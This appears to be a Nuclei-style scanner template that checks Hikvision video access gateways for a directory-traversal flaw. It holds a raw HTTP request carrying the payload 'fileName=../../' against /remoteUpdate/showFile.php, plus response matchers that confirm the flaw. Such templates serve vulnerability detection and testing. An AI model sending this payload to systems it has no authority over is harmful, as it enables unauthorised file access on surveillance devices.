id: Hikvision 视频接入网关-目录遍历

info:
  name: Hikvision 视频接入网关-目录遍历
  author: wintry
  severity: critical
  tags: hikvision

http:
  - raw:
      - |
        GET /remoteUpdate/showFile.php?fileName=../../ HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: body
        words:
          - '$('#mmt').menu('show', {'
          - 'fetchPlugJsonByFolder.php?dirName'

